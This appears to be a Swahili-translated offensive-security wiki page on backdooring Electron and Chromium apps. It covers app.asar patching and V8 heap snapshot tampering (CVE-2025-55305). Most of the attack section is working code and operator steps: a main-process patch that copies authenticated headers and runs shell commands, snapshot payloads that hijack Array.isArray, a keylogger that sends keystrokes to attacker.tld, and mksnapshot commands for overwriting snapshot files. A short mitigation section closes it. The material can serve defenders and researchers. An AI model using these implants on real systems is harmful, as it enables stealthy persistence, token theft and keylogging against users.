# Electron: Kuingiza Msimbo Ndani na Kuharibu Snapshot

{{#include ../../banners/hacktricks-training.md}}

## Kuingiza Msimbo Ndani ya Electron

Ukiweza kurekebisha au kuweka instrumentation kwenye programu ya Electron iliyosakinishwa ndani ya kifaa, unaweza kuifanya itekeleze JavaScript yoyote. Tazama:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Kwa maelezo kuhusu sehemu ya ndani ya Node inspector au Chromium DevTools ya debugging, tazama [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: ASAR/main-process implants

Ukipata **write access** kwenye saraka ya rasilimali za programu ya Electron, njia ya post-exploitation inayofaa sana ni **kurekebisha `app.asar`** (au entrypoint ya JS inayopakia) kisha kusubiri mtumiaji awashe programu tena. Tofauti na XSS inayohusu renderer pekee, msimbo unaopakiwa kutoka kwenye **main process** hutekelezwa ndani ya **Node.js runtime** ya programu, hivyo kwa kawaida unaweza kufikia **filesystem**, kuanzisha amri, kutumia Electron APIs, na kukagua hali ya programu baada ya mtumiaji kuingia.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Mtiririko wa kawaida wa kazi:

1. Toa yaliyomo kwenye `app.asar` na utambue faili halisi ya bootstrap kutoka `package.json` (`main`) au mantiki iliyopo ya kuwasha programu.
2. Ongeza loader ndogo kwenye **main process** (au hook ya preload/main-process) na uunde upya archive.
3. Subiri programu ianze tena, kisha tumia implant kunasa data ya runtime baada ya mtumiaji kufungua au kuingia kwenye programu ya desktop.

Mfano mdogo wa patch ya bootstrap:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Athari za kiutendaji:

- **Wizi wa data ya trusted client**: programu ya desktop inapofungua data kwa mtumiaji au kuipakia, implant inaweza kuisoma kutoka kwenye runtime. Hii ndiyo sababu **E2EE messaging clients** (Signal/Slack/Mattermost) na **vault/secret managers** bado ni malengo ya kuvutia katika kiwango cha endpoint.
- **Matumizi mabaya ya session/token**: Electron implants zinaweza kuiba cookies za app, bearer tokens, request headers, workspace files au repo credentials zinazofikiwa na client inayoendeshwa (kwa mfano, authenticated VS Code extensions au Git integrations).
- **Kuhamia kupitia muktadha wa mwathiriwa**: app iliyorekebishwa inaweza kupitisha requests kupitia workstation ya mwathiriwa, na kutumia tena IP ya mwathiriwa, TLS fingerprint na application session badala ya kutoa raw tokens pekee.

> [!NOTE]
> Ikiwa target imewasha **ASAR integrity** / **OnlyLoadAppFromAsar** au **fuses** za Electron zilizoimarishwa, huenda ukahitaji primitive tofauti ya local code-loading (kwa mfano, fuse abuse au snapshot tampering). Tazama ukurasa wa injection mahususi kwa macOS kwa chaguo zaidi za local implant na maelezo ya fuse.

## Kuweka backdoor ndani kupitia V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Programu zinazotumia Electron na Chromium hudeserialize V8 heap snapshot iliyotengenezwa awali wakati wa startup (v8_context_snapshot.bin, na kwa hiari browser_v8_context_snapshot.bin) ili kuanzisha kila V8 isolate (main, preload, renderer). Kihistoria, integrity fuses za Electron hazikuchukulia snapshots hizi kama executable content, kwa hiyo ziliepuka enforcement ya integrity inayotegemea fuse na ukaguzi wa code-signing wa OS. Kwa hivyo, kubadilisha snapshot katika installation inayoweza kuandikiwa na mtumiaji kulitoa utekelezaji wa code wa siri na endelevu ndani ya app bila kurekebisha binaries zilizotiwa saini au ASAR.<sup>[[2]](#references)</sup>

Mambo muhimu
- Pengo la integrity: EnableEmbeddedAsarIntegrityValidation na OnlyLoadAppFromAsar hukagua JavaScript ya app ndani ya ASAR, lakini hazikukagua V8 heap snapshots (CVE-2025-55305). Vivyo hivyo, Chromium haikagua integrity ya snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Masharti ya shambulio: Uwezo wa kuandika faili ndani ya installation directory ya app. Hili ni jambo la kawaida kwenye mifumo ambako Electron apps au Chromium browsers husakinishwa katika paths zinazoweza kuandikiwa na mtumiaji (k.m., %AppData%\Local kwenye Windows; /Applications kwa masharti fulani kwenye macOS).
- Athari: Utekelezaji wa kuaminika wa JavaScript ya mshambuliaji katika isolate yoyote kwa kubadilisha builtin inayotumiwa mara kwa mara (“gadget”), na hivyo kuwezesha persistence na kukwepa uthibitishaji wa code-signing.
- Sehemu zilizoathiriwa: Electron apps (hata zikiwa na fuses zimewashwa) na Chromium-based browsers zinazopakia snapshots kutoka kwenye locations zinazoweza kuandikiwa na mtumiaji.

Kutengeneza snapshot hasidi bila kujenga Chromium
- Tumia electron/mksnapshot iliyojengwa awali kukompile payload JS kuwa snapshot na kuandika juu ya v8_context_snapshot.bin ya application.<sup>[[5]](#references)[[6]](#references)</sup>

Mfano wa payload ndogo kabisa (thibitisha utekelezaji kwa kusababisha crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Uelekezaji wa payload unaozingatia isolate (endesha code tofauti katika main dhidi ya renderer)
- Utambuzi wa main process: Global za Node pekee kama process.pid, process.binding(), au process.dlopen hupatikana katika isolate ya main process.
- Utambuzi wa browser/renderer: Global za browser pekee kama alert hupatikana unapoendesha katika muktadha wa document.

Mfano wa gadget inayochunguza uwezo wa Node wa main process mara moja
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC ya wizi wa data katika muktadha wa Renderer/browser (k.m., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Mtiririko wa kazi wa Operator
1) Andika payload.js inayobadilisha builtin ya kawaida (kwa mfano, Array.isArray), na kwa hiari ichague tabia kulingana na isolate.
2) Tengeneza snapshot bila source za Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Andika juu ya file(s) za snapshot za application lengwa:
   - v8_context_snapshot.bin (hutumika kila wakati)
   - browser_v8_context_snapshot.bin (ikiwa fuse ya LoadBrowserProcessSpecificV8Snapshot inatumika)
4) Zindua application; gadget hutekelezwa kila builtin iliyochaguliwa inapotumika.

Maelezo na mambo ya kuzingatia
- Kukwepa ukaguzi wa integrity/signature: Files za snapshot hazichukuliwi kama native executables na ukaguzi wa code-signing, na (kihistoria) hazikujumuishwa kwenye fuses za Electron au vidhibiti vya integrity vya Chromium.
- Persistence: Kubadilisha snapshot katika install inayoweza kuandikiwa na user kwa kawaida hudumu baada ya app kuwashwa upya, na huonekana kama app halali iliyosainiwa.
- Vivinjari vya Chromium: Dhana hiyo hiyo ya tampering inatumika kwa Chrome/derivatives zilizosakinishwa katika maeneo yanayoweza kuandikiwa na user. Chrome ina mitigations nyingine za integrity, lakini inatenga wazi mashambulizi yanayohitaji ufikiaji wa moja kwa moja wa kifaa katika threat model yake.<sup>[[9]](#references)[[10]](#references)</sup>

Ugunduzi na mitigations
- Chukulia snapshots kama maudhui yanayoweza kutekelezwa na uyajumuishe katika utekelezaji wa integrity (suluhisho la CVE-2025-55305).
- Pendelea maeneo ya install yanayoweza kuandikiwa na admin pekee; weka baseline na ufuatilie hashes za v8_context_snapshot.bin na browser_v8_context_snapshot.bin.
- Tambua kubadilishwa kwa builtin mapema wakati wa runtime na mabadiliko yasiyotarajiwa ya snapshot; toa tahadhari wakati snapshots zilizodeserialize hazilingani na thamani zinazotarajiwa.

## References

- [1] [JS-Tap v3: Utekelezaji wa Post-Exploitation kwenye Endpoint kwa kutumia JavaScript Implants](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Kukwepa ukaguzi wa code integrity ili kuweka backdoor ndani ya Signal, 1Password, Slack na nyinginezo](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses za Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Integrity ya Electron ASAR](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Zima upakiaji wa code ambayo haijasainiwa (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Maswali Yanayoulizwa Mara kwa Mara kuhusu usalama wa Chrome: mashambulizi yanayohitaji ufikiaji wa moja kwa moja wa kifaa yako nje ya wigo](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
